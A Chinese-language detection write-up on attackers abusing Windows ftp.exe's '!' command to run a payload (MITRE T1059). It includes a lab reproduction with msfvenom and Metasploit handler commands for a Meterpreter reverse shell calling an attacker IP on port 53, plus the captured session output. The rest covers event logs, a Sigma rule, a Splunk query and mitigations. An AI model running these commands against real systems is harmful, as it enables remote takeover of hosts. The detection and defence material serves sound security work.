# T1059-Win-使用Ftp.exe执行Payload（白名单）

## 描述

攻击者可能利用Windows命令行界面工具（如`ftp.exe`）与系统交互，执行恶意命令或Payload，以实现恶意代码执行、持久性或横向移动（T1059）。`ftp.exe`是Windows操作系统内置的命令行FTP客户端，用于与FTP服务器交互，传输文件。由于其白名单特性，`ftp.exe`常被攻击者滥用，通过其交互模式运行本地可执行文件或脚本，规避传统安全检测。

攻击者可能通过`ftp.exe`的`!`命令在本地执行恶意Payload（如`payload.exe`），结合Metasploit反弹Shell。`ftp.exe`的默认路径（`C:\Windows\System32\ftp.exe`或`C:\Windows\SysWOW64\ftp.exe`）已被添加到系统环境变量`PATH`，因此可直接调用。检测重点在于监控`ftp.exe`的异常子进程、命令行参数和网络活动。

## 测试案例

1. **通过FTP执行本地Payload**  
   攻击者上传恶意可执行文件到靶机，通过`ftp.exe`的`!`命令执行，获取Meterpreter反弹Shell。

2. **结合FTP下载Payload**  
   攻击者使用`ftp.exe`从远程FTP服务器下载恶意文件并执行。

## 检测日志

**Windows安全日志**  
- **事件ID 4688**：记录进程创建，包含`ftp.exe`及其子进程（如`payload.exe`）的命令行参数（需启用命令行记录）。  
- **事件ID 5156**：记录应用程序的网络连接，包含`payload.exe`的出站连接信息。  
- **事件ID 4689**：记录进程终止，可能用于关联进程生命周期。

**Sysmon日志**  
- **事件ID 1**：记录进程创建，包含`ftp.exe`及其子进程的完整命令行、父进程和子进程信息。  
- **事件ID 3**：记录网络连接，可能涉及`payload.exe`的反弹Shell或FTP通信。  
- **事件ID 11**：记录文件创建，可能涉及下载的Payload文件。

**配置日志记录**  
- 启用命令行参数记录：  
  - 路径：`本地计算机策略 > 计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`（Windows Server 2008及以上）。  
- 部署Sysmon以增强进程、文件和网络活动监控。

## 测试复现

### 环境准备
- **攻击机**：Kali Linux 2019，安装Metasploit Framework。  
- **靶机**：Windows Server 2012，安装Sysmon并启用Windows安全日志。  
- **网络**：确保攻击机和靶机可通信（Shell端口53）。  
- **文件**：`payload.exe`已上传至靶机路径`C:\Users\12306Br0\Desktop\a\payload.exe`。

### 攻击步骤
1. **生成Payload**  
   在攻击机上使用`msfvenom`生成恶意可执行文件：
   ```bash
   msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o payload.exe
   ```

2. **设置Metasploit监听**  
   在攻击机上配置并启动Metasploit handler：
   ```bash
   msf5 > use exploit/multi/handler
   msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
   msf5 exploit(multi/handler) > set lhost 192.168.126.146
   msf5 exploit(multi/handler) > set lport 53
   msf5 exploit(multi/handler) > set AutoRunScript migrate -f
   msf5 exploit(multi/handler) > exploit
   [*] Started reverse TCP handler on 192.168.126.146:53
   ```

3. **靶机执行Payload**  
   在靶机上启动`ftp.exe`并执行本地Payload：
   ```cmd
   ftp
   ftp> !C:\Users\12306Br0\Desktop\a\payload.exe
   ```

**注意**：此复现仅用于学习和测试目的，需在合法授权的测试环境中进行，切勿用于非法活动。

4. **验证反弹Shell**  
   检查Metasploit终端，确认收到反弹Shell并完成进程迁移：
   ```bash
   [*] Started reverse TCP handler on 192.168.126.146:53
   [*] Sending stage (180291 bytes) to 192.168.126.149
   [*] Meterpreter session 1 opened (192.168.126.146:53 -> 192.168.126.149:49219) at 2025-06-06 23:08 PDT
   [*] Session ID 1 (192.168.126.146:53 -> 192.168.126.149:49219) processing AutoRunScript 'migrate -f'
   [*] Current server process: payload.exe (2324)
   [*] Spawning notepad.exe process to migrate to
   [+] Migrating to 2888
   [+] Successfully migrated to process
   meterpreter > getuid
   Server username: 12306Br0-PC\12306Br0
   ```

## 测试留痕

```log
EventID:4688 #安全日志，windows server 2012以上配置审核策略，可对命令参数进行记录
进程信息:
新进程 ID: 0x474
新进程名: C:\Windows\System32\cmd.exe

EventID:4688
进程信息:
新进程 ID: 0x3f8
新进程名: C:\Users\12306Br0\Desktop\a\payload.exe

EventID:5156
应用程序信息:
进程 ID: 1016
应用程序名称: \device\harddiskvolume2\users\12306br0\desktop\a\payload.exe

网络信息:
方向: 出站
源地址: 192.168.126.149
源端口: 49221
目标地址: 192.168.126.146
目标端口: 53
协议: 6

EventID:1 #sysmon日志
Image: C:\Windows\System32\cmd.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /C C:\Users\12306Br0\Desktop\a\payload.exe
CurrentDirectory: C:\Windows\system32\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500}
LogonId: 0x550ac
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8
ParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00}
ParentProcessId: 1112
ParentImage: C:\Windows\System32\ftp.exe
ParentCommandLine: ftp
```

## 检测规则/思路

**检测规则**  
通过分析Sysmon和Windows安全日志，检测`ftp.exe`执行Payload的异常行为。以下是具体思路：

1. **日志分析**：
   - 收集Sysmon事件ID 1或Windows安全事件ID 4688，提取`ftp.exe`及其子进程（如`cmd.exe`或`payload.exe`）的命令行参数。  
   - 监控Sysmon事件ID 3，检测`payload.exe`的出站网络连接（如反弹Shell）。  
   - 检查`ftp.exe`的父进程和命令行，识别是否通过`!`命令执行本地文件。

2. **Sigma规则**：
   ```yaml
   title: 可疑的Ftp.exe执行Payload
   id: 3c4d5e6f-7a8b-9c0d-1e2f-3c4d5e6f7a8b
   status: experimental
   description: 检测ftp.exe通过!命令执行本地Payload，可能表明恶意行为
   references:
     - https://attack.mitre.org/techniques/T1059/
     - https://www.77169.net/html/235306.html
   tags:
     - attack.execution
     - attack.t1059
     - attack.t1105
   logsource:
     category: process_creation
     product: windows
   detection:
     selection:
       EventID:
         - 1 # Sysmon
         - 4688 # Windows安全日志
       ParentImage|endswith: '\ftp.exe'
       Image|endswith:
         - '\cmd.exe'
         - '\powershell.exe'
         - '.exe' # 可执行文件
     condition: selection
   fields:
     - CommandLine
     - ParentCommandLine
   falsepositives:
     - 合法的FTP客户端操作
     - 管理员运行的自动化脚本
   level: high
   ```

3. **SIEM规则**：
   - 检测`ftp.exe`生成的可疑子进程。
   - 示例Splunk查询：
     ```spl
     source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 ParentImage="*\ftp.exe" Image IN ("*\cmd.exe", "*\powershell.exe", "*.exe") | stats count by Image, CommandLine, ParentImage, ComputerName, User
     ```

4. **网络流量分析**：
   - 监控`payload.exe`的出站连接，检测反弹Shell或FTP通信。  
   - 示例Wireshark过滤器：
     ```plaintext
     tcp.port == 53 or ftp
     ```

5. **威胁情报整合**：
   - 检查`payload.exe`的哈希值或网络连接的IP/URL是否与已知恶意活动相关，结合威胁情报平台（如VirusTotal、AlienVault）。

## 建议

### 缓解措施

防御`ftp.exe`的恶意使用需从权限控制、系统加固和监控入手：

1. **网络访问控制**  
   - 配置防火墙，限制`ftp.exe`及其子进程的出站连接，仅允许白名单IP/端口。  
   - 禁用靶机的FTP客户端功能，防止未经授权的连接。

2. **凭据保护**  
   - 启用多因素认证（MFA）保护管理员账户。  
   - 实施强密码策略，避免凭据泄露。

3. **日志和监控**  
   - 启用命令行参数记录，增强Windows安全日志（事件ID 4688）或Sysmon（事件ID 1/3/11）监控。  
   - 配置SIEM检测`ftp.exe`生成的可疑子进程或网络活动。

4. **定期审计**  
   - 使用Sysinternals Process Explorer检查`ftp.exe`的进程活动，识别异常子进程或网络请求。

### 检测

检测工作应集中在`ftp.exe`的异常子进程和网络行为上，包括但不限于：  
- **子进程监控**：分析Sysmon或Windows安全日志，检测`ftp.exe`生成`cmd.exe`或其他可执行文件。  
- **命令行分析**：检查`ftp.exe`的命令行参数，识别`!`命令执行本地文件的行为。  
- **网络流量监控**：检测`payload.exe`的出站连接（如反弹Shell）。  
- **威胁情报整合**：结合威胁情报，检查Payload文件的哈希值或网络连接是否与已知恶意活动相关。

## 参考推荐

- MITRE ATT&CK: T1059  
  <https://attack.mitre.org/techniques/T1059/>  
- 基于白名单Ftp.exe执行Payload  
  <https://www.77169.net/html/235306.html>  
- 基于白名单的Payload  
  <https://blog.csdn.net/weixin_30790841/article/details/101848854>
